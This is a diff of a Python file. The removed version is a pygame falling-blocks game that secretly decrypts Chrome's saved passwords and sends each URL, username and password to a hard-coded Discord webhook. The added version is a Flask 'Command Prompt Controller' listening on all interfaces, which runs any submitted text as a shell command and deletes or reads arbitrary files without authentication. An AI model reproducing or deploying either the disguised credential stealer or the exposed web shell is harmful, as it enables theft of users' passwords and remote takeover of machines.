@@ -1,199 +1,161 @@
-import pygame
-import random
+from flask import Flask, render_template_string, request
+import subprocess
 import os
-import re
-import sys
-import json
-import base64
-import sqlite3
-import win32crypt
-from Cryptodome.Cipher import AES
-import shutil
-import csv
-import requests
+import time
 
-# GLOBAL CONSTANTS
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
+# Definice barev pro banner
+yellow = "\033[33m"
+red = "\033[31m"
+reset = "\033[0m"
 
-# Discord Webhook URL
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1305436060616232980/nN8yYbZaWuDxbevpMFb1pD-wA9u7dEzKjYIKPP6Sm7nOZxJHlUsShPU_ExoTOF7Zpf63"  # Replace with your actual webhook URL
+app = Flask(__name__)
 
-# Initialize Pygame
-pygame.init()
+# HTML šablona s bannerem a formulářem
+html_template = '''
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Prompt - Controller</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #e9e9e9;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        .banner {
+            text-align: center;
+            font-family: monospace;
+            font-size: 20px;
+            color: #FF6347; /* Barva banneru */
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
 
-# Screen dimensions
-SCREEN_WIDTH = 800
-SCREEN_HEIGHT = 600
-screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
-pygame.display.set_caption("Dodge the Falling Blocks")
+<div class="container">
+    <div class="banner">
+        <p>_____<br>
+        __H__<br>
+        ["<br>
+        [)]<br>
+        [)] <span style="color:red">|V.</span></p>
+    </div>
+    <h2>Command Prompt Controller</h2>
+    <form method="POST">
+        <label for="cmd">Zadejte příkaz:</label>
+        <input type="text" id="cmd" name="cmd" placeholder="Například: ls -l">
+        <button type="submit">Spustit příkaz</button>
+    </form>
 
-# Colors
-WHITE = (255, 255, 255)
-BLACK = (0, 0, 0)
-RED = (255, 0, 0)
+    {% if result %}
+    <div class="result">
+        <h3>Výsledek příkazu:</h3>
+        <pre>{{ result }}</pre>
+    </div>
+    {% endif %}
+</div>
 
-# Game settings
-player_width = 50
-player_height = 50
-player_speed = 5
-block_width = 50
-block_height = 50
-block_speed = 5
-score = 0
+</body>
+</html>
+'''
 
-# Fonts
-font = pygame.font.SysFont(None, 36)
-
-# Player class
-class Player(pygame.sprite.Sprite):
-    def __init__(self):
-        super().__init__()
-        self.image = pygame.Surface((player_width, player_height))
-        self.image.fill(WHITE)
-        self.rect = self.image.get_rect()
-        self.rect.center = (SCREEN_WIDTH // 2, SCREEN_HEIGHT - 50)
-
-    def update(self, keys):
-        if keys[pygame.K_LEFT] and self.rect.left > 0:
-            self.rect.x -= player_speed
-        if keys[pygame.K_RIGHT] and self.rect.right < SCREEN_WIDTH:
-            self.rect.x += player_speed
-
-# Block class
-class Block(pygame.sprite.Sprite):
-    def __init__(self):
-        super().__init__()
-        self.image = pygame.Surface((block_width, block_height))
-        self.image.fill(RED)
-        self.rect = self.image.get_rect()
-        self.rect.x = random.randint(0, SCREEN_WIDTH - block_width)
-        self.rect.y = -block_height
-
-    def update(self):
-        global score
-        self.rect.y += block_speed
-        if self.rect.top > SCREEN_HEIGHT:
-            self.rect.y = -block_height
-            self.rect.x = random.randint(0, SCREEN_WIDTH - block_width)
-            score += 1  # Increase score when a block passes
-
-# Function to send data to Discord
-def send_to_discord(data):
-    try:
-        payload = {"content": data}
-        headers = {"Content-Type": "application/json"}
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
-        if response.status_code == 204:
-            print("[INFO] YOU ARE HACKED!.")
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    result = None
+    if request.method == 'POST':
+        cmd = request.form['cmd']
+        
+        # Zpracování příkazů
+        if cmd == "data_dump":
+            result = data_dump()
+        elif cmd.startswith("delete "):
+            result = delete_file(cmd)
+        elif cmd.startswith("gedit "):
+            result = gedit_file(cmd)
         else:
-            print(f"[ERR] Failed. Status code: {response.status_code}")
-    except Exception as e:
-        print(f"[ERR] Error sending to Discord: {str(e)}")
+            try:
+                # Vykonání libovolného shell příkazu
+                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                result = result.decode('utf-8')  # Převod na textový výstup
+            except subprocess.CalledProcessError as e:
+                result = f"Chyba při vykonávání příkazu: {e.output.decode('utf-8')}"
+    
+    return render_template_string(html_template, result=result)
 
-# Function to get Chrome secret key
-def get_secret_key():
+# Příkaz pro zálohování souborů (data_dump)
+def data_dump():
     try:
-        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        secret_key = secret_key[5:]
-        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-        return secret_key
+        if not os.path.exists("backup"):
+            os.makedirs("backup")
+        # Archivace složky 'data' do zálohovacího souboru
+        tar_file = "backup/backup_" + str(int(time.time())) + ".tar.gz"
+        subprocess.check_call(['tar', '-czf', tar_file, 'data'])
+
+        # Zkontroluje, zda byl soubor vytvořen
+        if os.path.exists(tar_file):
+            return f"Záloha byla úspěšně vytvořena: {tar_file}"
+        else:
+            return "Chyba při vytváření zálohy", 500
     except Exception as e:
-        print(f"{str(e)}")
-        print("[ERR] Chrome secret key cannot be found")
-        return None
+        return f"Chyba při zálohování: {str(e)}", 500
 
-# Function to decrypt passwords from Chrome
-def decrypt_password(ciphertext, secret_key):
-    try:
-        initialization_vector = ciphertext[3:15]
-        encrypted_password = ciphertext[15:-16]
-        cipher = AES.new(secret_key, AES.MODE_GCM, initialization_vector)
-        decrypted_pass = cipher.decrypt(encrypted_password)
-        return decrypted_pass.decode()
-    except Exception as e:
-        print(f"[ERR] Unable to decrypt password: {str(e)}")
-        return ""
+# Příkaz pro mazání souboru
+def delete_file(cmd):
+    # Extrahuje název souboru z příkazu
+    file_to_delete = cmd[7:].strip()  # Odstraní "delete " a ořízne mezery
+    if os.path.exists(file_to_delete):
+        os.remove(file_to_delete)
+        return f"Soubor {file_to_delete} byl úspěšně smazán."
+    else:
+        return f"Soubor {file_to_delete} nenalezen."
 
-# Function to get Chrome login database connection
-def get_db_connection(chrome_path_login_db):
-    try:
-        shutil.copy2(chrome_path_login_db, "Loginvault.db")
-        return sqlite3.connect("Loginvault.db")
-    except Exception as e:
-        print(f"[ERR] Chrome database cannot be found: {str(e)}")
-        return None
+# Příkaz pro zobrazení souboru (gedit)
+def gedit_file(cmd):
+    # Extrahuje název souboru z příkazu
+    file_to_edit = cmd[6:].strip()  # Odstraní "gedit " a ořízne mezery
+    if os.path.exists(file_to_edit):
+        with open(file_to_edit, 'r') as f:
+            return f.read()
+    else:
+        return f"Soubor {file_to_edit} nenalezen."
 
-# Game loop function
-def run_game():
-    global score
-    all_sprites = pygame.sprite.Group()
-    blocks = pygame.sprite.Group()
-
-    player = Player()
-    all_sprites.add(player)
-
-    for _ in range(5):
-        block = Block()
-        all_sprites.add(block)
-        blocks.add(block)
-
-    running = True
-    clock = pygame.time.Clock()
-
-    while running:
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT:
-                running = False
-
-        keys = pygame.key.get_pressed()
-        all_sprites.update(keys)
-
-        if pygame.sprite.spritecollide(player, blocks, False):
-            running = False
-
-        screen.fill(BLACK)
-        all_sprites.draw(screen)
-
-        score_text = font.render(f"Score: {score}", True, WHITE)
-        screen.blit(score_text, (10, 10))
-
-        pygame.display.flip()
-        clock.tick(60)
-
-    game_over_text = font.render("GAME OVER", True, WHITE)
-    score_text = font.render(f"Score: {score}", True, WHITE)
-    screen.fill(BLACK)
-    screen.blit(game_over_text, (SCREEN_WIDTH // 2 - game_over_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))
-    screen.blit(score_text, (SCREEN_WIDTH // 2 - score_text.get_width() // 2, SCREEN_HEIGHT // 2))
-    pygame.display.flip()
-    pygame.time.delay(3000)
-
-# Main function to handle game and password extraction
 if __name__ == '__main__':
-    run_game()
-
-    secret_key = get_secret_key()
-    folders = [folder for folder in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", folder) is not None]
-    with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
-        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-        csv_writer.writerow(["index", "url", "username", "password"])
-        for folder in folders:
-            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
-            conn = get_db_connection(chrome_path_login_db)
-            if secret_key and conn:
-                cursor = conn.cursor()
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for index, login in enumerate(cursor.fetchall()):
-                    url, username, ciphertext = login
-                    if url and username and ciphertext:
-                        decrypted_password = decrypt_password(ciphertext, secret_key)
-                        print(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}")
-                        csv_writer.writerow([index, url, username, decrypted_password])
-                        send_to_discord(f"**URL:** {url}\n**Username:** {username}\n**Password:** {decrypted_password}")
-                cursor.close()
-                conn.close()
-                os.remove("Loginvault.db")
+    app.run(debug=True, host='0.0.0.0', port=5000)
